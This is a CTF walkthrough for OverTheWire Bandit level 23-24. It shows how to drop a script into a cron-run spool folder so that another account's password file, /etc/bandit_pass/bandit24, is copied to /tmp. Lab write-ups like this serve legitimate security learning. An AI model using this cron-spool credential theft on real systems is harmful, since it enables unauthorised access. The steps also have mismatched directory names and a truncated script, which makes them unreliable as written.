# OverTheWire Bandit (Level 23-24)

# Objectives
  A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

    NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
    NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
# Command used
    ssh, echo, cat, cp, mkdir, cd, chmod

# Step By Step
1. Open the Ubuntu Terminal
2. Type command like this: ssh bandit23@bandit.labs.overthewire.org -p 2220
    # ssh is used to connect to the overthewire server and after @ was the hostlink of overthewire and -p is mean port and the port number of overthewire is 2220
3. The password is password that you get on level 22-23
4. After you in type this "cat /etc/cron.d/cronjob_bandit24"
5. And then "cat /usr/bin/cronjob_bandit23.sh", Verification: The script contains code like the following:
          #!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
6. After that type this "mkdir /tmp/mysript24", 
    # mkdir is represent "make directory on that location"
7. And then type "chmod 777 /tmp/myscript24"
    # read = 4, write = 2, execute = 1
    # ex: chmod 600 the left number is owner and the middle is group, and the right is others
8. After that type this "cd /tmp/myscript24"  and you will move to that directory
9. And then type this "echo '#!/bin/bash' > getpass.sh"
    # this will make a new script file named getpass and write #!/bin/bash at the first row to announce the operation system that the script must be executed using shell bash 
10. Type this "echo 'cat /etc/bandit_pass/bandit24 > /tmp/scriptgww/pass.txt' >> getpass.sh"
    # this will read the pass first and transfer it to the temporary files named pass.txt and add it to getpass 
    # FYI : ">" it mean delete all content of one file and change it to the new content but >> is only adding , no deleting
11. And after that type this "chmod 777 getpass.sh"
    # this will give full access to the file 
12. And then type this "cp getpass.sh /var/spool/bandit24/foo"
    # /var/spool/ temporary storage for jobs or data that are in queue before being processed by a particular system or service.
13. And the last command is "cat /tmp/scriptgww/pass.txt"

# AND CONGRATS YOU COMPLETE LEVEL 23